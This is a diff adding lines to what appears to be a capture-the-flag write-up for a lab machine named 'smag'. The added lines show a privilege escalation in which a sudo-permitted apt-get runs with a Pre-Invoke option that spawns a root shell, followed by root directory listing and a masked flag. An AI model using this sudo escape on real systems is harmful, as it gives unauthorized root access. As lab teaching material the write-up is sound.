@@ -220,6 +220,22 @@ Matching Defaults entries for jake on smag:
 
 User jake may run the following commands on smag:
     (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+# whoami
+root
+# cd /root
+# ls -al
+total 28
+drwx------  3 root root 4096 Jun  4 16:17 .
+drwxr-xr-x 22 root root 4096 Jun  4 11:35 ..
+-rw-------  1 root root    0 Jun  4 16:17 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Jun  4 11:56 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-rw----  1 root root   33 Jun  4 13:04 root.txt
+-rw-------  1 root root 1371 Jun  4 11:58 .viminfo
+# cat root.txt
+XXXXXXXXXXXXXXXXXXX
 ```
 
 
